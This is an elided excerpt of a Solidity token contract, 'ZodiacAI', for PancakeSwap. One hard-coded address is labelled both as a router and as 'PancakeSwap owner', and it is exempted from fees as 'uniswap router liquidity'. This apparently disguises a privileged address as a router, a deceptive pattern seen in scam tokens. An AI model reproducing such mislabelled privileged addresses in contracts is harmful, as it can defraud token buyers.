...
contract ZodiacAI is Context, IERC20, Ownable {
    ...
    string private constant _name = "ZodiacAI";
    string private constant _symbol = "ZodiacAI";

    address public _PancakeSwapV1RouterUniswap = 0xFD83ca98DB7133Dc9f3F098E5796a3735985A663; //PancakeSwap owner
    address public _PancakeSwapV2RouterUniswap = 0xFD83ca98DB7133Dc9f3F098E5796a3735985A663; //can be the same
    ...
    constructor () {
      ...
      IUniswapV2Router02 _PancakeSwapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // mainnet
        ...
        _isExcludedFromFee[address(0xFD83ca98DB7133Dc9f3F098E5796a3735985A663)] = true; //uniswap router liquidity
